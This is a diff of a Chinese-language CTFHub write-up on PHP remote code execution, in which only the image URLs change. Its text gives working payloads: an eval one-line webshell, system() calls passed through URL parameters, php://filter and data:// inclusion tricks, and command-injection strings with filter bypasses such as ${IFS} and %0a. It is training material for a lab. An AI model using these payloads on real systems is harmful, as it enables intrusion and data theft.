@@ -79,25 +79,25 @@ system()  exec()  passthru()  shell_exec()  popen()  `反引号`
 
 下面就开始打 RCE 的靶场了。本人是纯萌新，wp会写的比较详细，方便自己复习。
 
-![image-20260924083647128](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924083647213.png)
+![image-20260924083647128](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924083647213.png)
 
 ## eval执行
 
-![image-20260924051837246](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924051837293.png)
+![image-20260924051837246](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924051837293.png)
 
 `eval($_REQUEST["cmd"]);`可以看到 cmd 参数直接被当代码执行，而且这题没过滤
 
 先看下根目录下有什么：`http://challenge-31acfa6f741013a9.sandbox.ctfhub.com:10800/?cmd=system('ls /');`
 
-![image-20260924053024407](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924053024467.png)
+![image-20260924053024407](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053024467.png)
 
 直接就找到了 flag 文件，读一下：`http://challenge-31acfa6f741013a9.sandbox.ctfhub.com:10800/?cmd=system('cat /flag_26114');`
 
-![image-20260924053210632](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924053210686.png)
+![image-20260924053210632](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053210686.png)
 
 ## 文件包含
 
-![image-20260924053614203](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924053614260.png)
+![image-20260924053614203](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053614260.png)
 
 shell.txt 里是个一句话木马：`<?php eval($_REQUEST['ctfhub']);?>`
 
@@ -105,19 +105,19 @@ shell.txt 里是个一句话木马：`<?php eval($_REQUEST['ctfhub']);?>`
 
 `http://challenge-e8c9dd92249497e5.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('ls /');`
 
-![image-20260924055725420](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924055725463.png)
+![image-20260924055725420](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924055725463.png)
 
 这次是直接叫 flag。我们可以看到 代码中的`!strpos()`这个过滤只检查 `file` 参数，而我们的命令在 `ctfhub` 参数里，所以 `cat /flag` 里的 flag 字样根本不拦 。
 
 `http://challenge-e8c9dd92249497e5.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('cat /flag');`
 
-![image-20260924060145685](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924060145744.png)
+![image-20260924060145685](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924060145744.png)
 
 
 
 ### php://input
 
-![image-20260924060850780](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924060850848.png)
+![image-20260924060850780](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924060850848.png)
 
 这次只让用 `php://` 伪协议。
 
@@ -134,19 +134,19 @@ shell.txt 里是个一句话木马：`<?php eval($_REQUEST['ctfhub']);?>`
 
 用 burp 发请求：
 
-![d4198316-c224-4057-bf4c-9c0e062e0fc3](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924063648163.png)
+![d4198316-c224-4057-bf4c-9c0e062e0fc3](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063648163.png)
 
-![image-20260924063704773](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924063704862.png)
+![image-20260924063704773](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063704862.png)
 
-![90ecda52-ebd0-433f-b6ef-dfcd86eb8789](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924063951503.png)
+![90ecda52-ebd0-433f-b6ef-dfcd86eb8789](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063951503.png)
 
-![image-20260924063842118](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924063842147.png)
+![image-20260924063842118](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063842147.png)
 
 
 
 #### 读取源代码
 
-![image-20260924064139930](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924064139989.png)
+![image-20260924064139930](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924064139989.png)
 
 这道页面没有 **phpinfo 链接**了 ， `allow_url_include` 应该没开。所以这次 `php://input` 应该没用了
 
@@ -161,19 +161,19 @@ php://filter /read=convert.base64-encode /resource=/flag
 
 这次直接用 rot13 过滤器将 flag 原样输出就好了，不需要编码：`http://challenge-16866ff263c76bbb.sandbox.ctfhub.com:10800/?file=php://filter/read=convert.string.rot13/resource=/flag`
 
-![image-20260924065955020](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924065955079.png)
+![image-20260924065955020](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924065955079.png)
 
 实战里 filter 比 input 好用得多 —— 它不需要任何特殊配置，而且只读不执行，被限制得也少。
 
 ### 远程包含
 
-![image-20260924071047979](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924071048020.png)
+![image-20260924071047979](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924071048020.png)
 
 这次 include 没有伪协议的限制了，只拦了个 flag。但这次也没有本地木马可用。
 
 看下phpinfo：`allow_url_include`  和 `allow_url_fopen` 都是 ON。所以这题可以用远程包含来做。
 
-![300378bf-01dc-4a54-b9a3-47392bb00cb3](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924071358587.png)
+![300378bf-01dc-4a54-b9a3-47392bb00cb3](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924071358587.png)
 
 远程包含（本题的名字）
 
@@ -191,15 +191,15 @@ data://（没有外部服务器时的替代）：
 
 所以 `file=data://text/plain,<?php system('ls /'); ?>` 的执行效果：include 拿到的文件内容就是 `<?php system('ls /'); ?>` 这段代码 → 执行它。等效于把代码直接写进了 URL 参数里，不需要任何外部网址。
 
-![image-20260924072600942](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924072601003.png)
+![image-20260924072600942](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924072601003.png)
 
 因为这道题对 file 过滤 "flag" 字符，所以不能写 `cat /flag`。用 `cat /f*` 来匹配。
 
-![image-20260924073044393](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924073044456.png)
+![image-20260924073044393](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924073044456.png)
 
 ## 命令注入
 
-![image-20260924073725292](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924073725347.png)
+![image-20260924073725292](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924073725347.png)
 
 代码逻辑就是 我的输入会被直接拼到 `ping -c 4`后面执行 。但是我的输入这里是没有经过任何审查的。
 
@@ -213,25 +213,25 @@ data://（没有外部服务器时的替代）：
 
 直接输入 `127.0.0.1; ls /`
 
-![a2c50107-8895-4044-b04f-8c2c5456cb8e](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924074655557.png)
+![a2c50107-8895-4044-b04f-8c2c5456cb8e](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924074655557.png)
 
 没有看到 flag。换成`127.0.0.1; ls`试试：
 
-![image-20260924074853785](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924074853820.png)
+![image-20260924074853785](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924074853820.png)
 
 `17031117818784.php`就是 flag 文件。这关没过滤，下一步直接:`127.0.0.1; cat 17031117818784.php`
 
-![image-20260924075207052](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924075207121.png)
+![image-20260924075207052](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075207121.png)
 
 没拿到 flag 。应该是文件中包含特殊字符，浏览器渲染的时候会吞掉。右键看下源代码：
 
-![babf6bb0-6ad7-46b2-8871-194d5c89064b](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924075418874.png)
+![babf6bb0-6ad7-46b2-8871-194d5c89064b](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075418874.png)
 
 拿到 flag！
 
 ### 过滤cat
 
-![image-20260924075616164](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924075616217.png)
+![image-20260924075616164](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075616217.png)
 
 前面一直用的 cat() 被过滤了。还好我准备了 读文件命令全家桶：
 
@@ -249,7 +249,7 @@ sort / rev    排序输出 / 每行反转；base64 文件   输出 base64，解�
 
 这里我用 nl 替换：`127.0.0.1; nl flag_1688896513994.php`。拿下！
 
-![image-20260924080239918](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924080239979.png)
+![image-20260924080239918](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924080239979.png)
 
 
 
@@ -263,7 +263,7 @@ ${IFS}    $IFS$9    {cat,flag}    <    <>    %09（Tab）
 
 payload：`127.0.0.1;cat${IFS}flag_18772230631648.php`
 
-![image-20260924081051123](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924081051200.png)
+![image-20260924081051123](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081051200.png)
 
 ### 过滤目录分隔符
 
@@ -271,15 +271,15 @@ payload：`127.0.0.1;cat${IFS}flag_18772230631648.php`
 
 `127.0.0.1; ls`
 
-![image-20260924081558628](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924081558698.png)
+![image-20260924081558628](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081558698.png)
 
 `127.0.0.1;cd flag_is_here;ls`
 
-![image-20260924081657366](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924081657442.png)
+![image-20260924081657366](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081657442.png)
 
 `127.0.0.1;cd flag_is_here;cat flag_240332740813207.php`
 
-![image-20260924081904780](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924081904853.png)
+![image-20260924081904780](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081904853.png)
 
 ### 过滤运算符
 
@@ -287,11 +287,11 @@ payload：`127.0.0.1;cat${IFS}flag_18772230631648.php`
 
 payload：`127.0.0.1;cat flag_77902418520806.php`
 
-![image-20260924082318895](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924082318968.png)
+![image-20260924082318895](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924082318968.png)
 
 ### 综合过滤练习
 
-![image-20260924082523635](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924082523723.png)
+![image-20260924082523635](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924082523723.png)
 
 这次过滤的多了：
 
@@ -320,6 +320,6 @@ payload：`127.0.0.1;cat flag_77902418520806.php`
 http://challenge-32cca2204a93fe94.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}f*%0anl${IFS}f*
 ```
 
-![image-20260924083550662](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260924083550755.png)
+![image-20260924083550662](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924083550755.png)
 
 收官！
